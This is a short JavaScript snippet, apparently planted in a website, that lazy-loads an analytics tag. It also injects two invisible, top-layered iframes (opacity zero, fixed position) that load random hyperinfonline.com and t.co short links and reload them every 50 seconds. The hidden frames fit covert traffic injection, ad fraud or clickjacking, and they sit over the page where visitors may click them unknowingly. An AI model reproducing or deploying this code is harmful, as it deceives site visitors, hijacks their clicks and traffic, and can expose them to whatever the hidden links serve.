document.addEventListener('DOMContentLoaded', () => {
        let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
        if (Folt) {
            let Newel = document.createElement('span');
            Newel.innerHTML = `
            <style>
                iframe.invisible-frame {
                    position: fixed;
                    width: 20%;
                    height: 20%;
                    bottom: 30%;
                    border: none;
                    opacity: 0;
                    z-index: 39494;
                }
                iframe.invisible-frame.right {
                    right: 0;
                }
                iframe.invisible-frame.left {
                    left: 0;
                }
            </style> 
            <iframe class="invisible-frame right" id="postFrameRight" src=""></iframe>
            <iframe class="invisible-frame left" id="postFrameLeft" src=""></iframe>
            `;
            Folt.prepend(Newel);  

            var lazyanalisis = !1;
            window.addEventListener("scroll", function() {
                if ((document.documentElement.scrollTop !== 0 && !lazyanalisis) || (document.body.scrollTop !== 0 && !lazyanalisis)) {
                    (function() {
                        var e = document.createElement("script");
                        e.type = "text/javascript";
                        e.async = !0;
                        e.src = "https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";
                        var a = document.getElementsByTagName("script")[0];
                        a.parentNode.insertBefore(e, a);
                    })();
                    lazyanalisis = !0;
                }
            }, !0);

            window.dataLayer = window.dataLayer || [];
            function gtag() {
                dataLayer.push(arguments);
            }
            gtag('js', new Date());
            gtag('config', 'G-2VYRMPXK0F');
        }
    });

    const postUrlsRight = [
        'https://hyperinfonline.com/direct/2709',
        'https://t.co/RPBnQZqZY9',
        'https://hyperinfonline.com/direct/2113'
            ];

    const postUrlsLeft = [
        'https://t.co/AkmEyKCYmX'
    ];

    function goToRandomPostRight() {
        const randomIndex = Math.floor(Math.random() * postUrlsRight.length);
        const randomPostUrl = postUrlsRight[randomIndex];
        document.getElementById('postFrameRight').src = randomPostUrl;
    }

    function goToRandomPostLeft() {
        const randomIndex = Math.floor(Math.random() * postUrlsLeft.length);
        const randomPostUrl = postUrlsLeft[randomIndex];
        document.getElementById('postFrameLeft').src = randomPostUrl;
    }

    window.onload = function() {
        goToRandomPostRight();
        goToRandomPostLeft();
        setInterval(goToRandomPostRight, 50000);
        setInterval(goToRandomPostLeft, 50000);
    };
